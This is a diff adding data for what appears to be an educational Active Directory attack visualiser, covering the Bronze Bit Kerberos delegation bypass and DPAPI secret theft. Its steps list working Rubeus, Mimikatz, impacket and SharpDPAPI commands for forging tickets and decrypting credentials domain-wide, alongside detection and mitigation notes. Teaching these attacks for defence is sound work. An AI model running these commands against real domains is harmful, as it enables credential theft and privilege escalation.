+					tech: `<b>📋 BRONZE BIT BYPASS:</b><br>• S4U2Self tickets for protected users are NOT forwardable<br>• This blocks S4U2Proxy delegation<br>• Bronze Bit: FORGE the forwardable flag!<br><br><b>✅ WHAT IT BYPASSES:</b><br>• "Account is sensitive and cannot be delegated"<br>• Protected Users group<br>• Accounts blocked from delegation`,
+					warning: 'Bronze Bit was patched in November 2020 - CVE-2020-17049'
+				},
+				{
+					title: '1. Compromise Service with Constrained Delegation',
+					desc: 'Need hash of service account that has constrained delegation configured.',
+					active: 'attacker',
+					tech: `<b>🔍 FIND TARGETS:</b><br><code># PowerView</code><br><code>Get-DomainUser -TrustedToAuth</code><br><code>Get-DomainComputer -TrustedToAuth</code><br><br><b>📋 REQUIREMENTS:</b><br>• Service account with constrained delegation<br>• msDS-AllowedToDelegateTo configured<br>• Target user is "sensitive" or in Protected Users`
+				},
+				{
+					title: '2. S4U2Self (Non-Forwardable)',
+					desc: 'Request S4U2Self ticket for protected user. KDC returns non-forwardable ticket.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
+					tech: `<b>📋 NORMAL S4U2Self:</b><br>• Request ticket for protected user<br>• KDC checks: Is user protected/sensitive?<br>• Yes → Returns NON-forwardable ticket<br>• S4U2Proxy will FAIL<br><br><b>⚠️ THE PROBLEM:</b><br>• Non-forwardable = can't use for S4U2Proxy<br>• Attack chain broken...or is it?`
+				},
+				{
+					title: '3. Forge Forwardable Flag',
+					desc: 'Decrypt ticket with service hash, flip Forwardable bit, re-encrypt.',
+					active: 'attacker',
+					tech: `<b>🎯 RUBEUS - Bronze Bit:</b><br><code># S4U with /bronzebit flag</code><br><code>Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:ProtectedAdmin /msdsspn:CIFS/target /bronzebit /ptt</code><br><br><code># With AES</code><br><code>Rubeus.exe s4u /user:svc_sql /aes256:AESKEY /impersonateuser:ProtectedAdmin /msdsspn:CIFS/target /bronzebit /ptt</code><br><br><b>📋 HOW IT WORKS:</b><br>1. Decrypt S4U2Self ticket (we have service key)<br>2. Set Forwardable flag = TRUE<br>3. Re-encrypt ticket<br>4. Send modified ticket in S4U2Proxy`,
+					packet: { 'Original ticket': 'Forwardable = FALSE', 'Modified ticket': 'Forwardable = TRUE', 'KDC check': 'Only validates encryption, not flag source' }
+				},
+				{
+					title: '4. S4U2Proxy with Forged Ticket',
+					desc: 'Send S4U2Proxy with forged forwardable ticket. KDC accepts it!',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Proxy (forged)', type: 's4u' },
+					tech: `<b>✅ WHY IT WORKS:</b><br>• KDC validates ticket encryption ✓<br>• Encryption is valid (we have service key)<br>• KDC trusts Forwardable flag<br>• Doesn't re-check if user is protected<br><br><b>⚠️ PATCHED BEHAVIOR:</b><br>• After patch, KDC re-validates<br>• Checks user's actual protection status<br>• Ignores forwardable flag in ticket`
+				},
+				{
+					title: '5. Receive Target Service Ticket',
+					desc: 'KDC issues service ticket to target as the protected user.',
+					active: 'kdc',
+					anim: { from: 'kdc', to: 'target', label: 'TGS for Protected User', type: 'tgs-rep' }
+				},
+				{
+					title: '6. Access Target as Protected User',
+					desc: 'Full access to target service as the protected admin user!',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'target', label: 'AP-REQ', type: 'ap-req' },
+					tech: `<b>🛡️ DETECTION:</b><br>• S4U2Proxy for Protected Users (shouldn't work!)<br>• Event 4769: Delegation for sensitive accounts<br>• Compare ticket flags with user protection status<br><br><b>🛡️ MITIGATIONS:</b><br>• Apply November 2020 patches (KB4586781)<br>• PerformTicketSignature = 2 (enforce)<br>• Still use Protected Users for admins<br>• Audit constrained delegation rights`,
+					warning: 'Apply KB4586781 and set PerformTicketSignature = 2 in registry!'
+				}
+			]
+		},
+
+		'dpapi-abuse': {
+			title: 'DPAPI Abuse Attack',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has User/DC Access', x: 8, y: 45 },
+				{ id: 'victim', type: 'client', label: 'Victim', sublabel: 'User/Computer', x: 40, y: 20 },
+				{ id: 'dc', type: 'dc', label: 'Domain Controller', sublabel: 'DPAPI Backup Key', x: 60, y: 70 },
+				{ id: 'secrets', type: 'service', label: 'Secrets', sublabel: 'Credentials/Keys', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is DPAPI?',
+					desc: 'Data Protection API - Windows secret storage. Protects browser passwords, credentials, certificates, WiFi keys, and more.',
+					active: 'victim',
+					tech: `<b>📋 DPAPI PROTECTS:</b><br>• Chrome/Edge/Firefox passwords<br>• Windows Credential Manager<br>• Private keys and certificates<br>• WiFi passwords<br>• RDP saved credentials<br>• Scheduled task credentials<br><br><b>🔑 KEY HIERARCHY:</b><br>• User Master Key → User password<br>• Machine Master Key → DPAPI_SYSTEM<br>• Domain Backup Key → Can decrypt all!`,
+					warning: 'Domain DPAPI backup key can decrypt ANY user\'s secrets across the domain!'
+				},
+				{
+					title: '1. Locate DPAPI Blobs & Master Keys',
+					desc: 'Find encrypted data (DPAPI blobs) and master keys on target system.',
+					active: 'attacker',
+					tech: `<b>📍 MASTER KEY LOCATIONS:</b><br><code># User Master Keys</code><br><code>%APPDATA%\\Microsoft\\Protect\\{SID}\\</code><br><br><code># System Master Keys</code><br><code>%WINDIR%\\System32\\Microsoft\\Protect\\</code><br><br><b>📍 ENCRYPTED DATA:</b><br><code># Chrome passwords</code><br><code>%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data</code><br><br><code># Credential Manager</code><br><code>%APPDATA%\\Microsoft\\Credentials\\</code><br><br><code># WiFi profiles</code><br><code>%PROGRAMDATA%\\Microsoft\\Wlansvc\\Profiles\\</code>`
+				},
+				{
+					title: '2. Extract Master Keys',
+					desc: 'Decrypt master keys using user password, DPAPI_SYSTEM, or domain backup key.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'victim', label: 'Get Master Keys', type: 'malicious' },
+					tech: `<b>🎯 WITH USER PASSWORD:</b><br><code># Mimikatz - decrypt with password</code><br><code>dpapi::masterkey /in:masterkey_file /password:UserPass123</code><br><br><b>🎯 WITH DOMAIN ACCESS (RPC):</b><br><code># Decrypt via DC (needs network)</code><br><code>dpapi::masterkey /in:masterkey_file /rpc</code><br><br><b>🎯 LOCAL SYSTEM SECRETS:</b><br><code># Get DPAPI_SYSTEM LSA secret</code><br><code>lsadump::secrets</code><br><br><code># Decrypt machine masterkey</code><br><code>dpapi::masterkey /in:masterkey /system:DPAPI_SYSTEM</code>`
+				},
+				{
+					title: '3. Extract Domain Backup Key',
+					desc: 'With Domain Admin, extract the DPAPI domain backup key. Can decrypt ANY user\'s secrets!',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'dc', label: 'Get Backup Key', type: 'malicious' },
+					tech: `<b>🎯 MIMIKATZ - Domain Backup Key:</b><br><code># Export domain backup key (requires DA)</code><br><code>lsadump::backupkeys /system:DC01 /export</code><br><br><b>🐧 IMPACKET:</b><br><code>dpapi.py backupkeys -t corp.local/admin:pass@DC01 --export</code><br><br><b>✅ RESULT:</b><br>• PVK file containing domain private key<br>• Can decrypt ANY user's master keys<br>• Works offline - no DC access needed after<br>• Persists until key is rotated (rare)`,
+					warning: 'Domain backup key is rarely rotated - this is persistent access to all secrets!'
+				},
+				{
+					title: '4. Decrypt Secrets',
+					desc: 'Use master keys to decrypt DPAPI-protected data: credentials, passwords, certificates.',
+					active: 'attacker',
+					anim: { from: 'victim', to: 'secrets', label: 'Decrypt Secrets', type: 'ticket' },
+					tech: `<b>🎯 DECRYPT WITH BACKUP KEY:</b><br><code># Decrypt any user's masterkey</code><br><code>dpapi::masterkey /in:user_masterkey /pvk:domain_backup.pvk</code><br><br><b>🎯 DECRYPT CREDENTIALS:</b><br><code># Credential files</code><br><code>dpapi::cred /in:credential_file /masterkey:MASTERKEY</code><br><br><b>🎯 DECRYPT CHROME:</b><br><code># SharpChrome</code><br><code>SharpChrome.exe logins /unprotect</code><br><br><code># Or with Mimikatz</code><br><code>dpapi::chrome /in:"Login Data" /masterkey:KEY</code><br><br><b>🐧 IMPACKET:</b><br><code>dpapi.py credential -file CRED -key MASTERKEY</code>`
+				},
+				{
+					title: '5. Harvest All Domain Secrets',
+					desc: 'With domain backup key, systematically decrypt secrets from all user profiles.',
+					active: 'secrets',
+					tech: `<b>🎯 MASS EXTRACTION:</b><br><code># SharpDPAPI - Triage all secrets</code><br><code>SharpDPAPI.exe triage /pvk:backup.pvk</code><br><br><code># Target specific machine</code><br><code>SharpDPAPI.exe machinetriage /server:WORKSTATION01</code><br><br><code># All credentials domain-wide</code><br><code>SharpDPAPI.exe credentials /pvk:backup.pvk</code><br><br><b>🛡️ DETECTION:</b><br>• LSASS access patterns<br>• BackupKey RPC calls to DC<br>• Mass file access to Protect folders<br>• Event 4662: BCKUPKEY secret accessed<br><br><b>🛡️ MITIGATIONS:</b><br>• Credential Guard (protects DPAPI)<br>• Rotate domain backup key (complex)<br>• Limit DA access<br>• Monitor BCKUPKEY access`,
+					warning: 'Once extracted, domain backup key provides offline access to ALL user secrets!'
 				}
 			]
 		}
